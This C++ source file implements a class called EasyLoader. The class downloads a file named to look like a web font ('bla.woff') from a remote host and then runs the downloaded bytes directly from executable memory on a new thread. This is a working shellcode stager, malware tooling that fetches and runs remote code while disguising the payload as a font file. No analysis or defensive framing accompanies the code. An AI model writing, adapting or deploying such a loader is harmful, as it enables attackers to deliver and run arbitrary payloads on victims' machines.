#include "EasyLoader.h"

EasyLoader::EasyLoader(LPCSTR host, INTERNET_PORT port) : _host(host), _port(port) {
    _wofftext.data = nullptr;
    _wofftext.len = 0;
    HINTERNET hInternet = InternetOpenW(L"FetchDataApp", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        std::cerr << "InternetOpenW failed" << std::endl;
        return ;
    }

    WCHAR url[256];
    swprintf(url, 256, L"http://%S:%d/bla.woff", _host, _port);

    HINTERNET hConnect = InternetOpenUrlW(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnect == NULL) {
        std::cerr << "InternetOpenUrlW failed" << std::endl;
        InternetCloseHandle(hInternet);
        return ;
    }

    DWORD bytesRead = 0;
    DWORD bufferSize = 1024;
    PBYTE buffer = new BYTE[bufferSize];
    _wofftext.len = 0;

    while (InternetReadFile(hConnect, buffer + _wofftext.len, bufferSize - _wofftext.len, &bytesRead) && bytesRead > 0) {
        _wofftext.len += bytesRead;
        if (_wofftext.len + 1024 > bufferSize) {
            bufferSize *= 2;
            PBYTE newBuffer = new BYTE[bufferSize];
            RtlMoveMemory(newBuffer, buffer, _wofftext.len);
            delete[] buffer;
            buffer = newBuffer;
        }
    }

    if (_wofftext.len > 0) {
        PBYTE finalBuffer = new BYTE[_wofftext.len];
        RtlMoveMemory(finalBuffer, buffer, _wofftext.len);
        delete[] buffer;
        _wofftext.data = finalBuffer;
    }
    else {
        delete[] buffer;
        _wofftext.data = NULL;
        std::cerr << "No data fetched" << std::endl;
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return ;
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}


DWORD WINAPI EasyLoader::ExecuteRawData(LPVOID lpParameter) {
    t_WoffText* program = (t_WoffText*)lpParameter;

    // Allocate executable memory
    LPVOID execMem = VirtualAlloc(NULL, program->len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (execMem == NULL) {
        std::cerr << "VirtualAlloc failed" << std::endl;
        return 1;
    }

    // Copy the raw data to the allocated memory
    RtlMoveMemory(execMem, program->data, program->len);

    // Execute the raw data as a function
    ((void(*)())execMem)();

    // Free the allocated memory
    VirtualFree(execMem, 0, MEM_RELEASE);

    return 0;
}

void EasyLoader::EasyBulk()
{
    HANDLE hThread = CreateThread(NULL, 0, this->ExecuteRawData, &_wofftext, 0, NULL);
    if (hThread == NULL) {
        std::cerr << "CreateThread failed" << std::endl;
        return ;
    }

    // Wait for the thread to finish execution
    WaitForSingleObject(hThread, INFINITE);

    // Close the thread handle
    CloseHandle(hThread);
}